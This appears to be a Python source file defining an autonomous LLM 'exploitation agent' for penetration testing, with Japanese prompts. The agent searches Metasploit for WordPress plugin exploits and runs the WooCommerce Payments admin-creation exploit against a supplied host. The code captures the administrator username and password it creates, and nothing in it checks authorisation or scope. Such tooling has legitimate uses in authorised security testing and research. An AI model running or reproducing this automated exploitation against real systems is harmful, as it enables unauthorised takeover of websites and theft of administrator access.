import re
import subprocess
from contextlib import AsyncExitStack

from google.adk import Agent
from google.adk.agents import LlmAgent

from models import MODEL_GEMINI_2_0_FLASH


async def create_exploitation_agent() -> tuple[Agent, AsyncExitStack]:
    exit_stack = AsyncExitStack()
    agent = LlmAgent(
        model=MODEL_GEMINI_2_0_FLASH,
        name="exploitation_agent",
        description="攻撃 (Exploitation) を実施するエージェント",
        instruction="""
        あなたは PTES の Exploitation フェーズで活用される専門エージェントです。

        ## 攻撃手法

        1. vulnerability_analysis エージェントの診断結果を元に、msf_search_wordpress_exploit_module tool を使って攻撃に使える module を検索する。
        2. 検索された module に対応する tool が存在する場合は、それを実行する。
            a. woocommerce-payments の場合: msf_exploit_wp_woocommerce_payments_add_user
        """,
        tools=[msf_search_wordpress_exploit_module, msf_exploit_wp_woocommerce_payments_add_user],
    )
    return agent, exit_stack


def msf_search_wordpress_exploit_module(plugin_name: str) -> str:
    """
    WordPress プラグインの攻撃モジュールを検索する。

    Parameters:
        plugin_name (str): 検索対象のプラグイン名

    ## 戻り値

    ### モジュールが見つかった場合

    ```
    Matching Modules
    ================

       #  Name                                                     Disclosure Date  Rank    Check  Description
       -  ----                                                     ---------------  ----    -----  -----------
       0  auxiliary/scanner/http/wp_woocommerce_payments_add_user  2023-03-22       normal  Yes    Wordpress Plugin WooCommerce Payments Unauthenticated Admin Creation


    Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/http/wp_woocommerce_payments_add_user
    ```

    ### モジュールが見つからなかった場合

    ```
    This copy of metasploit-framework is more than two weeks old.
     Consider running 'msfupdate' to update to the latest version.
    [-] No results from search
    ```
    """

    cmd = ["msfconsole", "-q", "-x", f"search wordpress {plugin_name}; exit"]
    return subprocess.run(cmd, capture_output=True, text=True, check=True).stdout


def msf_exploit_wp_woocommerce_payments_add_user(
    target_host: str,
    target_port: int,
    targeturi: str = "/",
) -> str:
    """
    WordPress WooCommerce Payments プラグインの脆弱性を利用して、管理者ユーザを作成する。

    :param target_host: スキャン対象のホスト (例: '127.0.0.1')
    :param target_port: 対象ホストのポート番号 (例: 80)
    :param targeturi: WordPressのベースパス (デフォルト: '/')
    :return:
        - 作成されたユーザ名/パスワード (format: `username:password`)
        - 作成失敗した場合は、空文字列を返す
    """

    cmd = ["msfconsole", "-q", "-x", f"use scanner/http/wp_woocommerce_payments_add_user; set RHOSTS {target_host}; set RPORT {target_port}; set TARGETURI {targeturi}; run; exit"]
    res = subprocess.run(cmd, capture_output=True, text=True, check=True)
    userpass = re.findall(r"administrator user -> (.+:.+)", res.stdout)
    if len(userpass) == 0:
        return ""
    return userpass[0]
